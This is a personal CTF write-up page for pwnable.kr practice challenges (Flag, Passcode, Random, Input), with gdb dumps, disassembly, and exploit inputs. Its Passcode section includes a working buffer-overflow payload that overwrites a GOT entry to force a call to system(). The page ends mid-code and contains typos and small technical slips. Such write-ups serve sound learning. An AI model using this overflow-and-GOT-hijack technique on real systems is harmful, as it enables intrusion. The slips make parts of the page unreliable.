@@ -1,0 +1,935 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2024-10-23 Wed 21:48 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Pwnable Writeups</title>
+<meta name="author" content="Anthony Rossi" />
+<meta name="generator" content="Org Mode" />
+<style type="text/css">
+  #content { max-width: 60em; margin: auto; }
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #e6e6e6;
+    border-radius: 3px;
+    background-color: #f2f2f2;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: auto;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    top: -8px;
+    right: 12px;
+    padding: 3px;
+    color: #555;
+    background-color: #f2f2f299;
+  }
+  pre.src:hover:before { display: inline; margin-top: 14px;}
+  /* Languages per Org manual */
+  pre.src-asymptote:before { content: 'Asymptote'; }
+  pre.src-awk:before { content: 'Awk'; }
+  pre.src-authinfo::before { content: 'Authinfo'; }
+  pre.src-C:before { content: 'C'; }
+  /* pre.src-C++ doesn't work in CSS */
+  pre.src-clojure:before { content: 'Clojure'; }
+  pre.src-css:before { content: 'CSS'; }
+  pre.src-D:before { content: 'D'; }
+  pre.src-ditaa:before { content: 'ditaa'; }
+  pre.src-dot:before { content: 'Graphviz'; }
+  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-fortran:before { content: 'Fortran'; }
+  pre.src-gnuplot:before { content: 'gnuplot'; }
+  pre.src-haskell:before { content: 'Haskell'; }
+  pre.src-hledger:before { content: 'hledger'; }
+  pre.src-java:before { content: 'Java'; }
+  pre.src-js:before { content: 'Javascript'; }
+  pre.src-latex:before { content: 'LaTeX'; }
+  pre.src-ledger:before { content: 'Ledger'; }
+  pre.src-lisp:before { content: 'Lisp'; }
+  pre.src-lilypond:before { content: 'Lilypond'; }
+  pre.src-lua:before { content: 'Lua'; }
+  pre.src-matlab:before { content: 'MATLAB'; }
+  pre.src-mscgen:before { content: 'Mscgen'; }
+  pre.src-ocaml:before { content: 'Objective Caml'; }
+  pre.src-octave:before { content: 'Octave'; }
+  pre.src-org:before { content: 'Org mode'; }
+  pre.src-oz:before { content: 'OZ'; }
+  pre.src-plantuml:before { content: 'Plantuml'; }
+  pre.src-processing:before { content: 'Processing.js'; }
+  pre.src-python:before { content: 'Python'; }
+  pre.src-R:before { content: 'R'; }
+  pre.src-ruby:before { content: 'Ruby'; }
+  pre.src-sass:before { content: 'Sass'; }
+  pre.src-scheme:before { content: 'Scheme'; }
+  pre.src-screen:before { content: 'Gnu Screen'; }
+  pre.src-sed:before { content: 'Sed'; }
+  pre.src-sh:before { content: 'shell'; }
+  pre.src-sql:before { content: 'SQL'; }
+  pre.src-sqlite:before { content: 'SQLite'; }
+  /* additional languages in org.el's org-babel-load-languages alist */
+  pre.src-forth:before { content: 'Forth'; }
+  pre.src-io:before { content: 'IO'; }
+  pre.src-J:before { content: 'J'; }
+  pre.src-makefile:before { content: 'Makefile'; }
+  pre.src-maxima:before { content: 'Maxima'; }
+  pre.src-perl:before { content: 'Perl'; }
+  pre.src-picolisp:before { content: 'Pico Lisp'; }
+  pre.src-scala:before { content: 'Scala'; }
+  pre.src-shell:before { content: 'Shell Script'; }
+  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
+  /* additional language identifiers per "defun org-babel-execute"
+       in ob-*.el */
+  pre.src-cpp:before  { content: 'C++'; }
+  pre.src-abc:before  { content: 'ABC'; }
+  pre.src-coq:before  { content: 'Coq'; }
+  pre.src-groovy:before  { content: 'Groovy'; }
+  /* additional language identifiers from org-babel-shell-names in
+     ob-shell.el: ob-shell is the only babel language using a lambda to put
+     the execution function name together. */
+  pre.src-bash:before  { content: 'bash'; }
+  pre.src-csh:before  { content: 'csh'; }
+  pre.src-ash:before  { content: 'ash'; }
+  pre.src-dash:before  { content: 'dash'; }
+  pre.src-ksh:before  { content: 'ksh'; }
+  pre.src-mksh:before  { content: 'mksh'; }
+  pre.src-posh:before  { content: 'posh'; }
+  /* Additional Emacs modes also supported by the LaTeX listings package */
+  pre.src-ada:before { content: 'Ada'; }
+  pre.src-asm:before { content: 'Assembler'; }
+  pre.src-caml:before { content: 'Caml'; }
+  pre.src-delphi:before { content: 'Delphi'; }
+  pre.src-html:before { content: 'HTML'; }
+  pre.src-idl:before { content: 'IDL'; }
+  pre.src-mercury:before { content: 'Mercury'; }
+  pre.src-metapost:before { content: 'MetaPost'; }
+  pre.src-modula-2:before { content: 'Modula-2'; }
+  pre.src-pascal:before { content: 'Pascal'; }
+  pre.src-ps:before { content: 'PostScript'; }
+  pre.src-prolog:before { content: 'Prolog'; }
+  pre.src-simula:before { content: 'Simula'; }
+  pre.src-tcl:before { content: 'tcl'; }
+  pre.src-tex:before { content: 'TeX'; }
+  pre.src-plain-tex:before { content: 'Plain TeX'; }
+  pre.src-verilog:before { content: 'Verilog'; }
+  pre.src-vhdl:before { content: 'VHDL'; }
+  pre.src-xml:before { content: 'XML'; }
+  pre.src-nxml:before { content: 'XML'; }
+  /* add a generic configuration mode; LaTeX export needs an additional
+     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
+  pre.src-conf:before { content: 'Configuration File'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .equation-container {
+    display: table;
+    text-align: center;
+    width: 100%;
+  }
+  .equation {
+    vertical-align: middle;
+  }
+  .equation-label {
+    display: table-cell;
+    text-align: right;
+    vertical-align: middle;
+  }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  .org-svg { }
+</style>
+<script>
+  window.MathJax = {
+    tex: {
+      ams: {
+        multlineWidth: '85%'
+      },
+      tags: 'ams',
+      tagSide: 'right',
+      tagIndent: '.8em'
+    },
+    chtml: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '0em'
+    },
+    svg: {
+      scale: 1.0,
+      displayAlign: 'center',
+      displayIndent: '0em'
+    },
+    output: {
+      font: 'mathjax-modern',
+      displayOverflow: 'overflow'
+    }
+  };
+</script>
+
+<script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+</script>
+</head>
+<body>
+<div id="content" class="content">
+<h1 class="title">Pwnable Writeups</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org55ac670">1. Flag</a></li>
+<li><a href="#org76a98e0">2. Passcode</a></li>
+<li><a href="#org9c4806b">3. Random</a></li>
+<li><a href="#org4fe0bc6">4. Input</a></li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org55ac670" class="outline-2">
+<h2 id="org55ac670"><span class="section-number-2">1.</span> Flag</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+First I ran &rsquo;chmod +x flag&rsquo; to be able to execut the file.
+</p>
+
+<p>
+After I executed the file I was prompted with the message.
+</p>
+
+<p>
+I will malloc() and strcpy the flag there. take it.
+</p>
+
+<p>
+So, I then decided to run gdb and dissases main on the executable.
+</p>
+
+<p>
+However, the symbol table has been completley striped!
+</p>
+
+<p>
+After some googling I found out that this means that the symbols
+are unretreavable so I went back to the drawing board and the message
+for the level stood out.
+</p>
+
+<p>
+&ldquo;Papa brought me a packed present!&rdquo;
+</p>
+
+<p>
+What does packed indicate?
+</p>
+
+<p>
+After googling I found out that packed is another word for compressed.
+</p>
+
+<p>
+So I printed the strings of the file and greped for the word &rsquo;packed&rsquo;
+</p>
+
+<p>
+which revealed the file was packed with UDX.
+</p>
+
+<p>
+I downloaded UDX and unpacked the file which allowed me to disasem main
+and follow the malloc pointer to the flag,
+</p>
+
+<p>
+&ldquo;UPX&#x2026;? sounds like a delivery service :)&rdquo;
+</p>
+</div>
+</div>
+<div id="outline-container-org76a98e0" class="outline-2">
+<h2 id="org76a98e0"><span class="section-number-2">2.</span> Passcode</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+First i checked the prems of the files and saw that I could read the source code of passcode.
+</p>
+
+<p>
+I first ran the code and was met with a SEGV fault&#x2026;
+</p>
+
+<p>
+So, I looked through the code and noticed that the program was trying to
+scanf(&ldquo;%d&rdquo;, &lt;variable&gt;) which is causign the segv.
+</p>
+
+<p>
+The user is basically trying to write to the value of the variable rather than its adddress.
+</p>
+
+<p>
+And since the value of the variable is not a thing yet it results in a segv.
+</p>
+
+<p>
+<b>WE CAN USE THIS TO OUR ADVANTAGE</b>
+</p>
+
+<p>
+if we find out a way to overwrite the contents of passcode then we can write whatever we want to an address.
+</p>
+
+<p>
+So, i looked at the welcome function for ways to overload the buffer.
+</p>
+
+<p>
+I found that the name is being stored in a char[100] so I decided to overload the welcome with characters and track the stack as we go over into the login() function.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-nil">(gdb) disassemble login
+
+0x0804856f &lt;+11&gt;:    mov    %eax,(%esp)
+0x08048572 &lt;+14&gt;:    call   0x8048420 &lt;printf@plt&gt;
+0x08048577 &lt;+19&gt;:    mov    $0x8048783,%eax
+*0x0804857c &lt;+24&gt;:    mov    -0x10(%ebp),%edx*
+0x0804857f &lt;+27&gt;:    mov    %edx,0x4(%esp)
+0x08048583 &lt;+31&gt;:    mov    %eax,(%esp)
+
+(gdb) b *0x0804857c
+Breakpoint 1 at 0x804857c
+(gdb) r
+Starting program: /home/passcode/passcode
+Toddler's Secure Login System 1.0 beta.
+enter you name : test
+Welcome test!
+
+Breakpoint 1, 0x0804857c in login ()
+(gdb) x/xw $ebp-0x10
+
+*0xffc3a058:     0xf765dcbb*
+
+</pre>
+</div>
+
+
+<p>
+I found that the address of passcode1 is 0xffc3a058 which was pointing at 0xf765dcbb.
+</p>
+
+<p>
+With this info I can then follow the stack when I overflow it to see if these addresses are being overwritten&#x2026;AND THEY ARE!
+</p>
+
+<p>
+#+name stack trace
+</p>
+<div class="org-src-container">
+<pre class="src src-nil">(gdb) x/20xw $esp
+0xffeba290:     0x61616173      0x61616174      0x61616175      0x61616176
+0xffeba2a0:     0x61616177      0x61616178      *0x61616179*      0xa5aa0c00
+0xffeba2b0:     0xf7723000      0xf7723000      0xffeba2d8      0x08048684
+0xffeba2c0:     0x080487f0      0x08048250      0x080486a9      0x00000000
+0xffeba2d0:     0xf7723000      0xf7723000      0x00000000      0xf7588647
+</pre>
+</div>
+
+
+<p>
+As we can see the stack trace shows that the address 0xffc3a058 or passcode1 variable.
+</p>
+
+<p>
+To find the offsset we trace our input which was yaaa
+and find that it was at the 96th position of the character.
+</p>
+
+<p>
+Now we have the ability to overwrite any memory location we want.
+</p>
+
+<p>
+We can overwrite some GOT entries!
+</p>
+
+<p>
+if we use objdump to find the address of the GOT entries:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-nil">passcode@pwnable:~$ objdump -R passcode
+
+passcode:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049ff0 R_386_GLOB_DAT    __gmon_start__
+0804a02c R_386_COPY        stdin@@GLIBC_2.0
+0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0
+0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
+0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
+0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
+0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
+0804a014 R_386_JUMP_SLOT   __gmon_start__
+0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0
+0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
+0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
+
+</pre>
+</div>
+
+<p>
+Lets use <b>flush</b> since scanf and printf contain newline and null byte.
+</p>
+
+<p>
+Now if we gather the address of the assembly instructions for <i>system(&ldquo;/bin/cat flag&rdquo;)</i>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-nil">  0x080485ce &lt;+106&gt;:   cmpl   $0xcc07c9,-0xc(%ebp)
+   0x080485d5 &lt;+113&gt;:   jne    0x80485f1 &lt;login+141&gt;
+   0x080485d7 &lt;+115&gt;:   movl   $0x80487a5,(%esp)
+   0x080485de &lt;+122&gt;:   call   0x8048450 &lt;puts@plt&gt;
+   *0x080485e3 &lt;+127&gt;:   movl   $0x80487af,(%esp)*
+   0x080485ea &lt;+134&gt;:   call   0x8048460 &lt;system@plt&gt;
+   0x080485ef &lt;+139&gt;:   leave
+   0x080485f0 &lt;+140&gt;:   ret
+</pre>
+</div>
+
+<p>
+I had no clue how to identify which one was instruction so I had to use google to help (:
+</p>
+
+<p>
+and it was <b>0x080485e3</b>
+</p>
+
+<p>
+So now we can enter all we found together
+</p>
+
+<div class="org-src-container">
+<pre class="src src-nil">python -c "print '\x01'*96 + '\x04\xa0\x04\x08' + '134514147'" | ./passcode
+
+</pre>
+</div>
+
+<p>
+Passcode: Sorry mom.. I got confused about scanf usage :(
+</p>
+</div>
+</div>
+<div id="outline-container-org9c4806b" class="outline-2">
+<h2 id="org9c4806b"><span class="section-number-2">3.</span> Random</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+First looked at the c code
+</p>
+
+<div class="org-src-container">
+<pre class="src src-nil">#include &lt;stdio.h&gt;
+
+int main(){
+        unsigned int random;
+        random = rand();        // random value!
+
+        unsigned int key=0;
+        scanf("%d", &amp;key);
+
+        if( (key ^ random) == 0xdeadbeef ){
+                printf("Good!\n");
+                system("/bin/cat flag");
+                return 0;
+        }
+
+        printf("Wrong, maybe you should try 2^32 cases.\n");
+        return 0;
+}
+
+</pre>
+</div>
+
+<p>
+I ran the same program and printed out rand() and it printed out the same address everytime!
+</p>
+
+<p>
+<span class="underline">0x6b8b4567</span>
+</p>
+
+<p>
+looking at the c code it is xor&rsquo;ing the key with random&#x2026;
+</p>
+
+<p>
+so if we can enter the right binary as the key to xor with random to get 0xdeadbeef it will pass!
+</p>
+
+<p>
+0x6b8b4567 = 0110 1011 1000 1011 0100 0101 0110 0111
+</p>
+
+<p>
+key =        1011 0101 0010 0110 1111 1011 1000 1000
+</p>
+
+<p>
+0xdeadbeef = 1101 1110 1010 1101 1011 1110 1110 1111
+</p>
+
+<p>
+converted to binary: 3039230856
+</p>
+</div>
+</div>
+<div id="outline-container-org4fe0bc6" class="outline-2">
+<h2 id="org4fe0bc6"><span class="section-number-2">4.</span> Input</h2>
+<div class="outline-text-2" id="text-4">
+<p>
+first I looked at the code of the file input.c
+</p>
+
+<p>
+#+name input.c
+</p>
+<div class="org-src-container">
+<pre class="src src-c">
+<span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">main</span>(<span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">argc</span>, <span style="color: #ECBE7B;">char</span>* <span style="color: #dcaeea;">argv</span>[], <span style="color: #ECBE7B;">char</span>* <span style="color: #dcaeea;">envp</span>[]){
+    printf(<span style="color: #98be65;">"Welcome to pwnable.kr\n"</span>);
+    printf(<span style="color: #98be65;">"Let's see if you know how to give input to program\n"</span>);
+    printf(<span style="color: #98be65;">"Just give me correct inputs then you will get the flag :)\n"</span>);
+
+    <span style="color: #5B6268;">// </span><span style="color: #5B6268;">argv</span>
+    <span style="color: #51afef;">if</span>(argc != <span style="color: #da8548; font-weight: bold;">100</span>) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    <span style="color: #51afef;">if</span>(strcmp(argv[<span style="color: #98be65;">'A'</span>],<span style="color: #98be65;">"\x00"</span>)) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    <span style="color: #51afef;">if</span>(strcmp(argv[<span style="color: #98be65;">'B'</span>],<span style="color: #98be65;">"\x20\x0a\x0d"</span>)) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    printf(<span style="color: #98be65;">"Stage 1 clear!\n"</span>);
+
+    <span style="color: #5B6268;">// </span><span style="color: #5B6268;">stdio</span>
+    <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">buf</span>[<span style="color: #da8548; font-weight: bold;">4</span>];
+    read(<span style="color: #da8548; font-weight: bold;">0</span>, buf, <span style="color: #da8548; font-weight: bold;">4</span>);
+    <span style="color: #51afef;">if</span>(memcmp(buf, <span style="color: #98be65;">"\x00\x0a\x00\xff"</span>, <span style="color: #da8548; font-weight: bold;">4</span>)) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    read(<span style="color: #da8548; font-weight: bold;">2</span>, buf, <span style="color: #da8548; font-weight: bold;">4</span>);
+        <span style="color: #51afef;">if</span>(memcmp(buf, <span style="color: #98be65;">"\x00\x0a\x02\xff"</span>, <span style="color: #da8548; font-weight: bold;">4</span>)) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    printf(<span style="color: #98be65;">"Stage 2 clear!\n"</span>);
+
+    <span style="color: #5B6268;">// </span><span style="color: #5B6268;">env</span>
+    <span style="color: #51afef;">if</span>(strcmp(<span style="color: #98be65;">"\xca\xfe\xba\xbe"</span>, getenv(<span style="color: #98be65;">"\xde\xad\xbe\xef"</span>))) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    printf(<span style="color: #98be65;">"Stage 3 clear!\n"</span>);
+
+    <span style="color: #5B6268;">// </span><span style="color: #5B6268;">file</span>
+    <span style="color: #ECBE7B;">FILE</span>* <span style="color: #dcaeea;">fp</span> = fopen(<span style="color: #98be65;">"\x0a"</span>, <span style="color: #98be65;">"r"</span>);
+    <span style="color: #51afef;">if</span>(<span style="color: #51afef; font-weight: bold;">!</span>fp) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    <span style="color: #51afef;">if</span>( fread(buf, <span style="color: #da8548; font-weight: bold;">4</span>, <span style="color: #da8548; font-weight: bold;">1</span>, fp)!=<span style="color: #da8548; font-weight: bold;">1</span> ) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    <span style="color: #51afef;">if</span>( memcmp(buf, <span style="color: #98be65;">"\x00\x00\x00\x00"</span>, <span style="color: #da8548; font-weight: bold;">4</span>) ) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    fclose(fp);
+    printf(<span style="color: #98be65;">"Stage 4 clear!\n"</span>);
+
+    <span style="color: #5B6268;">// </span><span style="color: #5B6268;">network</span>
+    <span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">sd</span>, <span style="color: #dcaeea;">cd</span>;
+    <span style="color: #51afef;">struct</span> <span style="color: #ECBE7B;">sockaddr_in</span> <span style="color: #dcaeea;">saddr</span>, <span style="color: #dcaeea;">caddr</span>;
+    sd = socket(AF_INET, SOCK_STREAM, <span style="color: #da8548; font-weight: bold;">0</span>);
+    <span style="color: #51afef;">if</span>(sd == -<span style="color: #da8548; font-weight: bold;">1</span>){
+        printf(<span style="color: #98be65;">"socket error, tell admin\n"</span>);
+        <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    }
+    saddr.sin_family = AF_INET;
+    saddr.sin_addr.s_addr = INADDR_ANY;
+    saddr.sin_port = htons( atoi(argv[<span style="color: #98be65;">'C'</span>]) );
+    <span style="color: #51afef;">if</span>(bind(sd, (<span style="color: #51afef;">struct</span> <span style="color: #ECBE7B;">sockaddr</span>*)&amp;saddr, <span style="color: #51afef;">sizeof</span>(saddr)) &lt; <span style="color: #da8548; font-weight: bold;">0</span>){
+        printf(<span style="color: #98be65;">"bind error, use another port\n"</span>);
+            <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">1</span>;
+    }
+    listen(sd, <span style="color: #da8548; font-weight: bold;">1</span>);
+    <span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">c</span> = <span style="color: #51afef;">sizeof</span>(<span style="color: #51afef;">struct</span> <span style="color: #ECBE7B;">sockaddr_in</span>);
+    cd = accept(sd, (<span style="color: #51afef;">struct</span> <span style="color: #ECBE7B;">sockaddr</span> *)&amp;caddr, (<span style="color: #ECBE7B;">socklen_t</span>*)&amp;c);
+    <span style="color: #51afef;">if</span>(cd &lt; <span style="color: #da8548; font-weight: bold;">0</span>){
+        printf(<span style="color: #98be65;">"accept error, tell admin\n"</span>);
+        <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    }
+    <span style="color: #51afef;">if</span>( recv(cd, buf, <span style="color: #da8548; font-weight: bold;">4</span>, <span style="color: #da8548; font-weight: bold;">0</span>) != <span style="color: #da8548; font-weight: bold;">4</span> ) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    <span style="color: #51afef;">if</span>(memcmp(buf, <span style="color: #98be65;">"\xde\xad\xbe\xef"</span>, <span style="color: #da8548; font-weight: bold;">4</span>)) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    printf(<span style="color: #98be65;">"Stage 5 clear!\n"</span>);
+
+    <span style="color: #5B6268;">// </span><span style="color: #5B6268;">here's your flag</span>
+    system(<span style="color: #98be65;">"/bin/cat flag"</span>);
+    <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+}
+</pre>
+</div>
+
+<p>
+I noticed that its testing our knowledge of how a computer takes input&#x2026;
+</p>
+
+<p>
+So for the first challenge the following block depicts what we have to enter to continue
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c">    <span style="color: #5B6268;">// </span><span style="color: #5B6268;">argv</span>
+    <span style="color: #51afef;">if</span>(argc != <span style="color: #da8548; font-weight: bold;">100</span>) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    <span style="color: #51afef;">if</span>(strcmp(argv[<span style="color: #98be65;">'A'</span>],<span style="color: #98be65;">"\x00"</span>)) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    <span style="color: #51afef;">if</span>(strcmp(argv[<span style="color: #98be65;">'B'</span>],<span style="color: #98be65;">"\x20\x0a\x0d"</span>)) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+    printf(<span style="color: #98be65;">"Stage 1 clear!\n"</span>);
+</pre>
+</div>
+
+<p>
+So, argc must be 100 characters which means we have to pass 100 arguments in total to begin with. // the chi of the program
+</p>
+
+<p>
+Next it compares the index of A into the argument commads to the binary &rsquo;\x00&rsquo;.
+</p>
+
+<p>
+If we convert the char &rsquo;A&rsquo; to ASCII we get 65 which means that the 65th argument must be &rsquo;\x00&rsquo; and the same reasoning goes for the 3rd conditional.
+</p>
+
+<p>
+Lets use c to write the code to execute..
+</p>
+
+
+<div class="org-src-container">
+<pre class="src src-c">
+
+
+<span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;stdio.h&gt;</span>
+<span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;unistd.h&gt;</span>
+<span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;string.h&gt;</span>
+
+<span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">main</span>(){
+
+  <span style="color: #ECBE7B;">char</span> *<span style="color: #dcaeea;">filler</span>[<span style="color: #da8548; font-weight: bold;">101</span>];
+
+  <span style="color: #51afef;">for</span>(<span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">i</span> =<span style="color: #da8548; font-weight: bold;">0</span>; i &lt; <span style="color: #da8548; font-weight: bold;">101</span>; i++){
+    filler[i] = <span style="color: #98be65;">"#"</span>;
+  }
+
+  filler[<span style="color: #98be65;">'A'</span>] = <span style="color: #98be65;">"\x00"</span>;
+  filler[<span style="color: #98be65;">'B'</span>] = <span style="color: #98be65;">"\x20\x0a\x0d"</span>;
+  filler[<span style="color: #da8548; font-weight: bold;">100</span>] = <span style="color: #a9a1e1;">NULL</span>;
+
+  execve(<span style="color: #98be65;">"/home/input2/input"</span>, filler, <span style="color: #a9a1e1;">NULL</span>);
+}
+
+</pre>
+</div>
+
+
+<p>
+Now for phase 2 looking at the code&#x2026;
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #5B6268;">// </span><span style="color: #5B6268;">stdio</span>
+<span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">buf</span>[<span style="color: #da8548; font-weight: bold;">4</span>];
+read(<span style="color: #da8548; font-weight: bold;">0</span>, buf, <span style="color: #da8548; font-weight: bold;">4</span>);
+<span style="color: #51afef;">if</span>(memcmp(buf, <span style="color: #98be65;">"\x00\x0a\x00\xff"</span>, <span style="color: #da8548; font-weight: bold;">4</span>)) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+read(<span style="color: #da8548; font-weight: bold;">2</span>, buf, <span style="color: #da8548; font-weight: bold;">4</span>);
+<span style="color: #51afef;">if</span>(memcmp(buf, <span style="color: #98be65;">"\x00\x0a\x02\xff"</span>, <span style="color: #da8548; font-weight: bold;">4</span>)) <span style="color: #51afef;">return</span> <span style="color: #da8548; font-weight: bold;">0</span>;
+printf(<span style="color: #98be65;">"Stage 2 clear!\n"</span>);
+</pre>
+</div>
+
+<p>
+We can see that the code creates a buffer of 4 bits and firstly
+calls the read command which takes a file descriptor, buffer, and size<sub>t</sub>(which is the amount of bits to read).
+</p>
+
+<p>
+the first is reading from file descriptor 0 which is stdin and the second is reading from fd 2 which is stderror&#x2026; weird.
+</p>
+
+<p>
+If we find a way to write the data &ldquo;\x00\x0a\x02\xff&rdquo; to stderror then we can pass this phase!
+</p>
+
+<p>
+maybe we can use the opposite of the read function, write().
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c">
+<span style="color: #c678dd;">write</span>(<span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">fd</span>, <span style="color: #51afef;">const</span> <span style="color: #ECBE7B;">void</span> <span style="color: #dcaeea;">buf</span>[.count], <span style="color: #ECBE7B;">size_t</span> <span style="color: #dcaeea;">count</span>)
+</pre>
+</div>
+
+<p>
+<i>Lets expand on our c code</i>.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c">
+
+<span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;stdio.h&gt;</span>
+<span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;unistd.h&gt;</span>
+<span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #98be65;">&lt;string.h&gt;</span>
+
+<span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">main</span>(){
+
+  <span style="color: #ECBE7B;">char</span> *<span style="color: #dcaeea;">filler</span>[<span style="color: #da8548; font-weight: bold;">101</span>];
+
+  <span style="color: #51afef;">for</span>(<span style="color: #ECBE7B;">int</span> <span style="color: #dcaeea;">i</span> =<span style="color: #da8548; font-weight: bold;">0</span>; i &lt; <span style="color: #da8548; font-weight: bold;">101</span>; i++){
+    filler[i] = <span style="color: #98be65;">"#"</span>;
+  }
+
+  filler[<span style="color: #98be65;">'A'</span>] = <span style="color: #98be65;">"\x00"</span>;
+  filler[<span style="color: #98be65;">'B'</span>] = <span style="color: #98be65;">"\x20\x0a\x0d"</span>;
+  filler[<span style="color: #da8548; font-weight: bold;">100</span>] = <span style="color: #a9a1e1;">NULL</span>;
+
+  execve(<span style="color: #98be65;">"/home/input2/input"</span>, filler, <span style="color: #a9a1e1;">NULL</span>);
+
+  <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">buf</span>[<span style="color: #da8548; font-weight: bold;">4</span>] = <span style="color: #98be65;">"\x00\x0a\x02\xff"</span>;
